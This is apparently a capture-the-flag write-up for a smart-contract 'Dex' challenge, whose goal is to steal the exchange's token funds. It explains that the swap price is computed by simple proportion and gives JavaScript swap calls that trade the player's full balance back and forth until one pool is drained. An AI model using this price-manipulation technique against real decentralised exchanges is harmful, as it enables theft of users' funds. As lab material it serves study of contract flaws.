# Answer

Goal: Steal DEX funds (at least of one of the tokens).

## 1. Approving tokens

Before we can begin swapping we need to call `approve()` of dex with high enough value so we wouldn't need to repeatedly call it (example: '50000').

## 2. Exploiting swap

It is hard to call this an exploit, since the `getSwapPrice()` performs as expected (bad). It is using simple proportion to calculate the outcome and if keep trading maximum amounts the output will start growing exponentially.

```js
await contract.swap(token1Addr, token2Addr, await contract.balanceOf(token1Addr, player)) // in T1 (10) -> out T2 (10)
await contract.swap(token2Addr, token1Addr, await contract.balanceOf(token2Addr, player)) // in T2 (20) -> out T1 (24)
await contract.swap(token1Addr, token2Addr, await contract.balanceOf(token1Addr, player)) // in T1 (24) -> out T2 (30)
await contract.swap(token2Addr, token1Addr, await contract.balanceOf(token2Addr, player)) // in T2 (30) -> out T1 (47)
...
```

You can see how the output amount is growing, eventually we hit an amount the exchange is unable to swap due to insufficient balance. But in that case, just calculate the exact required input to drain the output token to 0.
